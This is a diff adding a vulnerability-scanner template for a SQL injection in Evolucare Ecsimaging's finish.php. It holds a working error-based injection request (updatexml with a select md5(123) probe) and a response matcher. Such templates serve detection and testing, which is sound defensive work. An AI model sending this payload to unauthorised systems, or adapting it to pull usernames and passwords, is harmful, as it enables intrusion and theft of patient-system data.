@@ -1,0 +1,29 @@
+id: evolucare-ecsimaging-sql-injection
+info:
+  name: Evolucare Ecsimaging SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Evolucare Ecsimaging before version 6.21.5 contains a SQL injection vulnerability in the `finish.php` file. Attackers can exploit this vulnerability to obtain sensitive information, such as usernames and passwords.
+  reference:
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5508
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        GET /ecnc/finish.php?OR=1%20and%201=(updatexml(1,concat(0x3a,(select%20md5(123))),1)) HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+        part: body
